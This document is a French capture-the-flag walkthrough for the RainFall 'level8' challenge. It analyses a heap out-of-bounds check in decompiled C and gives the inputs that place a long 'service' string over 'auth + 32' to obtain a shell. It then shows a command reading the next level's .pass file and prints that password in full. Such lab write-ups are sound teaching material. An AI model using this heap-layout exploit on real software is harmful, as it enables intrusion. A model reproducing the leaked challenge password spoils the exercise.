# level8: Exploitation de la disposition du Heap

## Aperçu du Challenge

Level8 présente un programme qui gère l'authentification et les services, avec une vulnérabilité dans ses modèles d'accès mémoire. Le programme accepte des commandes sous forme de chaînes de caractères et permet de configurer les variables auth et service, puis de les vérifier pour une connexion.

## Analyse du Code Source

Le programme maintient deux pointeurs globaux:

```c
char *auth = NULL;
char *service = NULL;
```

Et implémente quatre commandes:

```c
// Gestion de la commande "auth "
if (strncmp(input_buffer, "auth ", 5) == 0) {
    auth = malloc(4);  // Alloue seulement 4 octets!
    // ...initialisation et copie de l'entrée...
}
// Gestion de la commande "service"
else if (strncmp(input_buffer, "service", 7) == 0) {
    service = strdup(input_buffer + 7);  // Allocation sur le heap
}
// Gestion de la commande "login" - vulnérabilité principale
else if (strncmp(input_buffer, "login", 5) == 0) {
    // Vulnérabilité: auth fait seulement 4 octets mais on vérifie 32 octets plus loin
    if (auth != NULL && *(int*)(auth + 32) != 0) {
        system("/bin/sh");
    } else {
        fwrite("Password:\n", 1, 10, stdout);
    }
}
```

## Vulnérabilité

La vulnérabilité se trouve dans la logique de la commande `login`, qui vérifie la mémoire 32 octets après l'allocation de `auth`:

```c
if (auth != NULL && *(int*)(auth + 32) != 0) {
    system("/bin/sh");
}
```

Le pointeur `auth` ne pointe que vers une région de 4 octets, donc vérifier `auth + 32` est une vérification de mémoire hors limites. Cela crée une opportunité de manipuler la disposition du heap pour contrôler ce qui se trouve à cet emplacement.

## Exploitation

L'exploitation profite de la façon dont la mémoire heap est allouée:

1. Utiliser `auth` pour allouer un petit buffer (4 octets)
2. Utiliser `service` avec une entrée volumineuse pour allouer de la mémoire qui se superposera avec `auth + 32`
3. Utiliser `login` pour déclencher le shell lorsque la valeur à `auth + 32` n'est pas nulle

Le programme affiche utilement les adresses à chaque étape:

```
level8@RainFall:~$ ./level8
(nil), (nil)                # Les deux pointeurs commencent comme NULL
auth A                      # Création de auth avec un contenu minime
0x804a008, (nil)           # auth est maintenant alloué à 0x804a008
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018      # service alloué à 0x804a018
login                      # Appel à login - la vérification à auth+32 n'est pas nulle
$                          # Shell accordé!
```

En examinant les adresses, on peut voir:

- `auth` est à 0x804a008
- `service` est à 0x804a018
- La mémoire à `auth + 32` (0x804a028) contiendra des données non nulles de notre chaîne service

## Obtention du Mot de Passe

Une fois le shell obtenu, on récupère le mot de passe:

```bash
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## Passage au Niveau Suivant

Utilisez le mot de passe pour vous connecter au level9:

```bash
level8@RainFall:~$ su level9
Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
level9@RainFall:~$
```
